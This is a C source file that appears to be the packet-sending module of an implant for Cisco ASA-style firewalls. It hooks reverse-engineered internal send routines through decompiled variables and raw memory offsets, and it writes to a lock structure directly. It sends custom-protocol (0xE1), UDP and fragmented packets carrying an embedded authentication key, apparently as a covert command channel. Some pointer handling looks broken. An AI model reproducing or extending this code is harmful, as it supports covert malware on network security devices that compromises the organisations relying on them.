#include "send.h"
#include "asa_func.h"
#include "global.h"

#define Linux

#ifdef Windows
#include <windows.h>
typedef unsigned __int8 uint8_t;
#endif // Windows

#ifdef Linux
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <arpa/inet.h>
#endif // Linux

int entry_func(char *recv_packet, char *pkt_info)
{
    int retVal = 0;

    retVal = main(recv_packet, pkt_info);

    return retVal;
}

static int send_ip_packet(unsigned int destIP, unsigned int srcIP, char *payload, unsigned short payloadLength, char protoType)
{
    int pktLength = 0;
    ASA_SEND_PKT *pSendPkt = NULL;
    ASA_IP_INFO *pIpInfo = NULL;
    char *v14 = NULL;
    char *v6 = NULL;
    char *v4 = NULL;
    int v5 = 0;
    int *v10 = NULL;
    int v11 = 0;
    int v3 = 0;
    short int *pv3High = NULL;
    short int *pv3Low = NULL;
    char *pRouterTable = NULL;
    char *pIpMapMac = NULL;
    int retVal = 0;
    char chSwap = 0x00;
    int idx = 0;
    unsigned short ipPktLen = 0;
    int needFreeSendStru = 0;
    int val = 0;
    GLOBAL_VAR *pGlobalVar = NULL;
    int reserveLen = 0;

    reserveLen = MTU - sizeof(ETH_HEADER) - sizeof(IP_HEADER);
    if(reserveLen < payloadLength)
        return ERR_OVERSIZE_PAYLOAD;

    pGlobalVar = get_local_global_var_addr();
    if(pGlobalVar->recv_packet == NULL || pGlobalVar->pkt_info == NULL)
        return ERR_NO_PKT_INFO;
    val = get_can_send_val(pGlobalVar->recv_packet, pGlobalVar->pkt_info);
    if(val == -1)
    {
        retVal = ERR_GET_PKT_INFO_VAL;
        goto end;
    }

    //////////////////////////////////////////////////////////////////////
    //构造数据包描述结构
    pSendPkt = (ASA_SEND_PKT *)asa_alloc_send_pkt(ALLOC_SEND_PKT_SIZE);
    if(pSendPkt == NULL)
    {
        retVal = ERR_SEND_PKT_MALLOC;
        goto end;
    }
    needFreeSendStru = 1;
    pIpInfo = pSendPkt->p_ip_info;
    pIpInfo->shost = srcIP;
    pIpInfo->dhost = destIP;
    pIpInfo->flags = 0;
    pIpInfo->proto_type = protoType;
    pIpInfo->payload_len = (payloadLength >> 8) | ((uint8_t)payloadLength << 8);

    pSendPkt->p_Buff += sizeof(ASA_IP_INFO);
    asa_memcopy(pSendPkt->p_Buff, (char *)payload, payloadLength);
    pSendPkt->p_Buff += payloadLength;

    v14 = get_send_func_addr_var(&val, 4, 16);    //获取一个全局变量地址
    if(v14 == NULL)
    {
        retVal = ERR_GET_GLOB_VAR;
        goto end;
    }

    //填充IP报文
    asa_add_ip_packet(pSendPkt);

    pv3High = (short int *)&(((char *)&v3)[2]);
    pv3Low = (short int *)&(((char *)&v3)[0]);
    *pv3High = *(short int *)&(((char *)&val)[2]);
    if(*pv3High < 0)
    {
        *pv3Low = 0xFFFF;
    }
    else
    {
        *pv3Low = 0x0000;
    }

    //进入临界区
    v4 = *(int *)get_dec_lock_addr();
    v10 = (int *)(v4 + 428);
    if(v4 == -428)
    {
        retVal = ERR_LOCK;
        goto end;
    }
    v5 = *(int *)(v4 + 428);
    *(int *)(v4 + 428) = v3;
    v11 = v5;

    asa_dec_lock(val);
    v6 = asa_about_thread_vcid(val);

    if(v6 == NULL)
    {
        retVal = ERR_GET_STRU;
        goto end;
    }

    pRouterTable = asa_malloc(32);
    if(pRouterTable == NULL)
    {
        retVal = ERR_ROUTABLE_MALLOC;
        goto end;
    }
    if(asa_find_router_table(destIP, pRouterTable))
    {
        pIpMapMac = asa_find_mac_with_ip(destIP, pRouterTable, *(unsigned int *)(pRouterTable + 16), v6);
        if(pIpMapMac == NULL)
        {
            retVal = ERR_IP_MAP_MAC;
            goto end;
        }
        asa_add_router_mac(pSendPkt, pIpMapMac+36, 8);
        asa_send(v14, pSendPkt);
        needFreeSendStru = 0;
        retVal = 0;
    }
    else
    {
        retVal = ERR_FIND_ROUTABLE;
    }

end:
    if(retVal != ERR_GET_GLOB_VAR && v10 != NULL)
    {
        *v10 = v11;
    }
    if(pRouterTable != NULL)
    {
        asa_free(pRouterTable);
    }
    if(pSendPkt != NULL && needFreeSendStru != 0)
    {
        asa_free_send_pkt(&pSendPkt);
    }

    return retVal;
}

static int gener_proto_hdr_with_payload(char *buff, unsigned short buffLen, char *payload, \
                                        unsigned short payloadLen, unsigned char protoType)
{
    char key[20];
    PROTO_HDR protoHdr;
    GLOBAL_VAR *pGlobalVar = NULL;

    if(buffLen - payloadLen < sizeof(protoHdr))
        return ERR_OVERSIZE_PAYLOAD;

    ex_memset(buff, 0x00, buffLen);
    ex_memset(key, 0x00, sizeof(key));
    ex_memset((char *)&protoHdr, 0x00, sizeof(protoHdr));

    pGlobalVar = get_local_global_var_addr();
    if(pGlobalVar->recv_packet == NULL || pGlobalVar->pkt_info == NULL)
        return ERR_NO_REV_PKT;

    protoHdr.type = protoType;
    protoHdr.payload_len = payloadLen;
    ex_strcat(protoHdr.key, get_auth_key(key));

    ex_memcpy(buff, (char *)&protoHdr, sizeof(protoHdr));
    ex_memcpy(buff + sizeof(protoHdr), payload, payloadLen);

    return 0;
}

int send_proto_via_ip(unsigned int destIP, unsigned int srcIP, char *payload, \
                      unsigned short payloadLen, unsigned char protoType)
{
    char buff[PKT_BUFF_SIZE];
    GLOBAL_VAR *pGlobalVar = NULL;
    int retVal = 0;
    int reserveLen = 0;

    ex_memset(buff, NULL, sizeof(buff));

    pGlobalVar = get_local_global_var_addr();

    reserveLen = sizeof(ETH_HEADER) + sizeof(IP_HEADER) + sizeof(PROTO_HDR);
    if(pGlobalVar->exist_vlan_tag)
        reserveLen += 4;
    if(MTU - reserveLen < payloadLen)
        return ERR_OVERSIZE_PAYLOAD;

    retVal = gener_proto_hdr_with_payload(buff, sizeof(buff), payload, payloadLen, protoType);
    if(retVal != 0)
        return retVal;

    return send_ip_packet(destIP, srcIP, buff, sizeof(PROTO_HDR) + payloadLen, 0xE1);
}

int send_proto_via_udp(unsigned int destIP, unsigned int srcIP, unsigned short destPort, unsigned short srcPort, \
                       char *payload, unsigned short payloadLen, unsigned char protoType)
{
    char buff[PKT_BUFF_SIZE];
    UDP_HEADER *pUdp = (UDP_HEADER *)buff;
    GLOBAL_VAR *pGlobalVar = NULL;
    int retVal = 0;
    int reserveLen = 0;

    ex_memset(buff, NULL, sizeof(buff));

    pGlobalVar = get_local_global_var_addr();

    reserveLen = sizeof(ETH_HEADER) + sizeof(IP_HEADER) + sizeof(UDP_HEADER) + sizeof(PROTO_HDR);
    if(pGlobalVar->exist_vlan_tag)
        reserveLen += 4;
    if(MTU - reserveLen < payloadLen)
        return ERR_OVERSIZE_PAYLOAD;

    pUdp->sport = srcPort;
    pUdp->dport = destPort;
    pUdp->length = conv_byte_order_short(sizeof(UDP_HEADER) + sizeof(PROTO_HDR) + payloadLen);

    retVal = gener_proto_hdr_with_payload(buff + sizeof(UDP_HEADER), sizeof(buff) - sizeof(UDP_HEADER), \
                                          payload, payloadLen, protoType);
    if(retVal != 0)
        return retVal;

    return send_ip_packet(destIP, srcIP, buff, sizeof(UDP_HEADER) + sizeof(PROTO_HDR) + payloadLen, 0x11);
}

int send_proto_via_frag(unsigned int destIP, unsigned int srcIP, unsigned short destPort, unsigned short srcPort, \
                            char *payload, unsigned short payloadLen, unsigned char protoType, unsigned char sendProto)
{
    char buff[PKT_BUFF_SIZE];
    PKT_FRAG_HDR pktFragHdr;
    GLOBAL_VAR *pGlobalVar = NULL;
    int retVal = 0;
    int reserveLen = 0;
    int fragLen = 0;
    unsigned short fragID = 0;

    pGlobalVar = get_local_global_var_addr();
    if(pGlobalVar->frag_sequence > 4293918720)
        pGlobalVar->frag_sequence = 0;
    pGlobalVar->frag_sequence++;

    reserveLen = sizeof(ETH_HEADER) + sizeof(IP_HEADER) + sizeof(PROTO_HDR) + sizeof(PKT_FRAG_HDR) + 1;
    if(pGlobalVar->exist_vlan_tag)
        reserveLen += 4;
    if(sendProto == USE_UDP)
        reserveLen += sizeof(UDP_HEADER);
    if(sendProto == USE_TCP)
        reserveLen += sizeof(TCP_HEADER);

    while(payloadLen > 0)
    {
        ex_memset(buff, NULL, sizeof(buff));
        ex_memset(&pktFragHdr, NULL, sizeof(pktFragHdr));

        fragLen = ((payloadLen > (MTU - reserveLen)) ? (MTU - reserveLen) : payloadLen);
        payloadLen -= fragLen;

        //fragment header
        fragID++;           //每组分片报文的ID从1开始
        pktFragHdr.sequence = pGlobalVar->frag_sequence;
        pktFragHdr.id = fragID;
        pktFragHdr.fin_flag = ((payloadLen == 0) ? 1 : 0);
        pktFragHdr.payload_len = fragLen;
        pktFragHdr.type = protoType;

        //wrap
        ex_memcpy(buff, &pktFragHdr, sizeof(pktFragHdr));
        ex_memcpy(buff + sizeof(pktFragHdr), payload, fragLen);
        payload += fragLen;

        //send fragment pkt
        if(sendProto == USE_IP)
        {
            retVal = send_proto_via_ip(destIP, srcIP, buff, sizeof(pktFragHdr) + fragLen, PROTO_FRAG);
        }
        else
        {
            retVal = send_proto_via_udp(destIP, srcIP, destPort, srcPort, buff, sizeof(pktFragHdr) + fragLen, PROTO_FRAG);
        }
    }

    return retVal;
}




